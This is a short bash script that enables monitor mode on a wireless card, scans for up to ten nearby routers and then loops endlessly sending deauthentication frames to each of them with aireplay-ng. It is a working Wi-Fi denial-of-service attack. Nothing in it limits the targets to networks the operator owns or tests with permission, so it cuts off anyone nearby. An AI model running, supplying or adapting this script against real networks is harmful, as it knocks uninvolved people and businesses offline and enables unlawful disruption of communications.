#!/bin/bash

interface="wlan0"
mon_interface="${interface}mon"

cleanup() {
    echo "[*] Stopping monitor mode and restoring network..."
    sudo airmon-ng stop $mon_interface > /dev/null 2>&1
    sudo systemctl start NetworkManager
    exit
}

trap cleanup INT

echo "[*] Enabling monitor mode..."
sudo airmon-ng start $interface > /dev/null 2>&1

echo "[*] Scanning for nearby routers (fast scan)..."
bssids=()
channels=()
sudo timeout 10s airodump-ng --output-format csv -w /dev/shm/scan --write-interval 1 $mon_interface > /dev/null 2>&1
IFS=$'\n'
for line in $(grep -aE "([0-9A-F]{2}:){5}[0-9A-F]{2}" /dev/shm/scan-01.csv | head -n 10); do
    bssid=$(echo $line | cut -d',' -f1 | tr -d ' ')
    channel=$(echo $line | cut -d',' -f4 | tr -d ' ')
    [[ -n "$bssid" && -n "$channel" ]] && bssids+=("$bssid") && channels+=("$channel")
done

if [ ${#bssids[@]} -eq 0 ]; then
    echo "[!] No routers found."
    cleanup
fi

echo "[*] Found ${#bssids[@]} targets. Starting deauth attack..."

while true; do
    for i in "${!bssids[@]}"; do
        bssid="${bssids[$i]}"
        channel="${channels[$i]}"
        sudo iwconfig $mon_interface channel $channel
        echo "[*] Deauthing $bssid on channel $channel..."
        sudo aireplay-ng --deauth 10 -a $bssid $mon_interface > /dev/null 2>&1
        sleep 1
    done
done
